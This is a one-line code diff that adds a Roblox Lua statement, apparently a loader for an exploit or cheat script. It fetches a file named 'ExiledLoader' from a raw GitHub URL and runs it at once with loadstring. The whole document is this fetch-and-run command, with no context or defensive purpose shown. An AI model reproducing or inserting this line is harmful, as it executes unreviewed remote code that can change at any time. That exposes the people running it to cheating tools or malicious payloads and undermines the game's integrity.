@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VaxKs/Exiled/refs/heads/main/ExiledLoader", true))()
